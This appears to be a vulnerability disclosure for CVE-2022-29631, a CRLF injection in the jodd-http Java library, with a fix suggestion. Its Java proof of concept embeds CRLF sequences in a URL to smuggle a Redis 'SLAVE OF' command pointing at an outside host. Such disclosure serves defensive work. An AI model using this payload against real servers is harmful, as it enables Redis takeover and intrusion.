| <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29631> CRLF injection vulnerability in jodd-http CRLF injection vulnerability in `jodd.http.HttpRequest#set` and `jodd.http.HttpRequest#send` in `jodd-http` version 5.0.x , 5.1.x , 5.2.x , 6.0.x , 6.1.x , 6.2.x ( **all versions so far** ) , allows remote attackers to inject arbitrary TCP payload via CRLF sequences in a URL . Proof of concept ： ```         <dependency>             <groupId>org.jodd</groupId>             <artifactId>jodd-http</artifactId>             <version>6.2.0</version>         </dependency> ```  ``` package top.inhann;  import jodd.http.HttpRequest; import jodd.http.HttpResponse;  public class Test {     public static void main(String[] args) {         String url = "http://127.0.0.1:6379/ HTTP/1.1\r\nHost: 127.0.0.1:6379\r\n\r\nSLAVE OF inhann.top:6379\r\n\r\nPOST / ";         HttpRequest req = HttpRequest.get(url);         HttpResponse res = req.send();     } } ```  run the poc , listen on `127.0.0.1:6379`  [image-20220418002705451](https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2022/04/image-20220418002705451.png) details ： in `jodd.http.HttpRequest#set()` when processing path ，`this.path(destination);` is called ，and it is allowed to inject `\r\n` in query string and path and fragment .  in `jodd.http.HttpRequest#sendTo()` , `this.buffer(true);` is called , and trying to build the http request payload . However , the path , query string , frament and othor components are just appended insecurely , which leads to the crlf injection . suggestion : it is recommended to urlencode the invalid characters when constructing the http request payload . |
